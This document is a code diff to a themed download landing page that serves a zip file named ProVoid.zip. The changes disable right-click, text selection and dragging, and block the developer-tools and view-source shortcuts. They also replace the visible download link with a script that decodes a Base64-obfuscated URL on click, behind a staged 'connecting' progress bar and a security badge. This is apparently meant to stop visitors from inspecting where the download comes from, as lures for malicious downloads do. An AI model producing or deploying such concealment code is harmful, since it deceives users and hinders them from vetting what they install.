@@ -22,6 +22,7 @@
             justify-content: center; 
             overflow: hidden; 
             position: relative;
+            user-select: none; /* Prevents text highlighting */
         }
 
         /* Cosmic Background */
@@ -251,12 +252,12 @@
             background: rgba(255, 255, 255, 0.12);
         }
         
+        /* The final button is now a DIV, not an A tag */
         .btn-ready { 
             background: rgba(255, 255, 255, 0.05); 
             border: 2px solid rgba(255, 255, 255, 0.3); 
             color: #fff; 
             display: none; 
-            text-decoration: none;
             backdrop-filter: blur(10px);
         }
 
@@ -352,12 +353,9 @@
         }
     </style>
 </head>
-<body>
-
-    <canvas id="cosmic-canvas"></canvas>
+<body oncontextmenu="return false;"> <canvas id="cosmic-canvas"></canvas>
     <div class="void-gradient"></div>
 
-    <!-- Black Hole & Crystal -->
     <div class="blackhole-container">
         <div class="blackhole"></div>
         <div class="accretion-disk"></div>
@@ -392,10 +390,10 @@
             <div class="status-text" id="status">Connecting to server...</div>
         </div>
 
-        <a href="https://github.com/GhostExe-cloud/D-Lead/releases/download/v1/ProVoid.zip" class="btn btn-ready" id="final-btn">
+        <div class="btn btn-ready" id="final-btn">
             <span>Download Now</span>
             <span>⬇</span>
-        </a>
+        </div>
 
         <div class="security-badge">
             <span>🛡️</span>
@@ -406,7 +404,15 @@
     </div>
 
     <script>
-        // Cosmic Canvas
+        // --- 1. Security Logic ---
+        // Block F12, Ctrl+Shift+I, Ctrl+U (View Source)
+        document.onkeydown = function(e) {
+            if(e.keyCode == 123) return false;
+            if(e.ctrlKey && e.shiftKey && (e.keyCode == 'I'.charCodeAt(0) || e.keyCode == 'J'.charCodeAt(0) || e.keyCode == 'C'.charCodeAt(0))) return false;
+            if(e.ctrlKey && e.keyCode == 'U'.charCodeAt(0)) return false;
+        };
+
+        // --- 2. Cosmic Background Logic ---
         const canvas = document.getElementById('cosmic-canvas');
         const ctx = canvas.getContext('2d');
         let particles = [];
@@ -433,10 +439,8 @@
                 ctx.arc(p.x, p.y, p.radius, 0, Math.PI * 2);
                 ctx.fillStyle = `rgba(255, 255, 255, ${p.opacity})`;
                 ctx.fill();
-                
                 p.y += p.speed;
                 if (p.y > canvas.height) p.y = -5;
-                
                 p.opacity += (Math.random() - 0.5) * 0.02;
                 p.opacity = Math.max(0.2, Math.min(0.8, p.opacity));
             });
@@ -447,8 +451,9 @@
         animate();
         window.addEventListener('resize', initCanvas);
 
-        // Download Logic
+        // --- 3. Download & Hidden Link Logic ---
         let isChecked = false;
+        // The link remains Base64 encoded in the script only
         const encryptedLink = "aHR0cHM6Ly9naXRodWIuY29tL0dob3N0RXhlLWNsb3VkL0QtTGVhZC9yZWxlYXNlcy9kb3dubG9hZC92MS9Qcm9Wb2lkLnppcA==";
 
         function toggleCheck() {
@@ -462,7 +467,6 @@
                 return;
             }
 
-            // Hide verify step, show loading
             document.getElementById('verify-step').style.display = 'none';
             document.getElementById('loading-step').style.display = 'block';
 
@@ -483,10 +487,7 @@
             const interval = setInterval(() => {
                 progress += Math.random() * 1.5 + 0.5;
                 if (progress > 100) progress = 100;
-                
                 bar.style.width = progress + "%";
-                
-                // Update text based on percentage
                 const msgIndex = Math.floor((progress / 100) * messages.length);
                 status.innerText = messages[Math.min(msgIndex, messages.length - 1)];
 
@@ -495,8 +496,16 @@
                     setTimeout(() => {
                         document.getElementById('loading-step').style.display = 'none';
                         const finalBtn = document.getElementById('final-btn');
-                        finalBtn.href = atob(encryptedLink);
                         finalBtn.style.display = 'flex';
+
+                        // Manual Trigger (Hides URL from hover and context menu)
+                        finalBtn.onclick = function() {
+                            const secureUrl = atob(encryptedLink);
+                            window.location.href = secureUrl;
+                        };
+
+                        // Extra security to block drag-and-drop link stealing
+                        finalBtn.ondragstart = function() { return false; };
                     }, 600);
                 }
             }, 50);
